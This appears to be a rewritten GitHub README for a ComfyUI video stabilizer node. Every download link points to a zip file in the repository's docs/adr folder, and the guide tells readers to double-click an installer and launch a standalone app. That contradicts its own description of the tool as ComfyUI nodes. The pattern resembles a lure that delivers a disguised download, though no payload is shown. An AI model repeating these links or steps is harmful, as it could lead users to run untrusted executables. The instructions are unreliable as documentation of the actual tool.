# 🎥 ComfyUI-Video-Stabilizer - Smooth Your Videos Easily

[![Download Now](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)

## 📜 Overview

The ComfyUI Video Stabilizer is a tool designed to improve video quality by reducing unwanted shaky movements. It uses powerful algorithms to provide a stable viewing experience. 

You can achieve smooth videos using two main methods:

- **Classic**: This method uses feature points and the Lucas-Kanade technique for stabilization.
- **Flow**: This method employs DIS Optical Flow for enhanced accuracy but may require more processing power.

### 📏 Framing Modes

The application supports three different framing modes to suit your needs:

- **Crop**: Eliminates shake but reduces your field of view by zooming in on the video.
- **Crop and Pad**: Minimizes zoom as much as possible while adding padding around the video.
- **Expand**: Keeps the entire frame visible by extending the canvas instead of cropping.

Additional padding is available as a mask, which you can use with outpainting tools, such as VACE.

## 🔌 Node List

The ComfyUI Video Stabilizer consists of two key nodes:

- **Video Stabilizer (Classic)**: This is a lightweight, general-purpose stabilization option based on OpenCV and NumPy.
- **Video Stabilizer (Flow)**: This node offers higher accuracy using DIS Optical Flow but may use more CPU resources.

## ⚙️ Features

- Easy installation and user-friendly interface.
- Supports various video formats.
- Adjustable frame rates for better performance.
- Offers options for different stabilization techniques.

## 📋 Parameters

Both stabilization methods share several parameters:

- **frame_rate**: A floating-point value that determines the frames per second for video playback. Setting the correct frame rate can significantly enhance video output quality.

You can find additional parameters and features in the application settings once it's installed.

## 🚀 Getting Started

### Step 1: Install ComfyUI

To begin using ComfyUI Video Stabilizer, you first need to install the ComfyUI framework. Follow the instructions on the official ComfyUI GitHub page to set it up.

### Step 2: Download ComfyUI Video Stabilizer

Visit the [Releases page here](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip) to download the latest version of ComfyUI Video Stabilizer.

### Step 3: Running the Application

1. After downloading, locate the installation file on your computer.
2. Double-click the file to start the installation.
3. Follow the prompts to complete the installation.

### Step 4: Launch ComfyUI Video Stabilizer

Once installed, open the ComfyUI Video Stabilizer from your applications menu. 

### Step 5: Import Your Video

To stabilize a video:

1. Click the "Import" button.
2. Select the video file you want to stabilize from your computer.

### Step 6: Choose Stabilization Method

In the application, choose either the "Classic" or "Flow" stabilization method based on your needs. Adjust any parameters if necessary.

### Step 7: Select Framing Mode

Pick your preferred framing mode (Crop, Crop and Pad, or Expand) to customize how the output video will look.

### Step 8: Export the Stabilized Video

Once you’re happy with your settings, click the "Export" button to save the stabilized video. Choose your desired format and location to store the file.

## 📥 Download & Install

To download the ComfyUI Video Stabilizer, visit the releases page: [Download Here](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)

Follow the installation steps to get started as outlined above.

## 📊 System Requirements

- **Operating System**: Windows 10 or higher, macOS, or a modern Linux distribution.
- **CPU**: Dual-core processor or higher.
- **RAM**: Minimum of 4GB, 8GB recommended for best performance.
- **Disk Space**: At least 1GB available for installation and temporary files.

## 💡 Tips for Optimal Performance

- Ensure your graphics drivers are up to date for better processing.
- Close any unnecessary applications while using the stabilizer to free up system resources.
- Experiment with different parameters and modes to find the best results for your specific videos.

By following these steps, you will be able to successfully download and run the ComfyUI Video Stabilizer, allowing you to enhance your video quality with ease.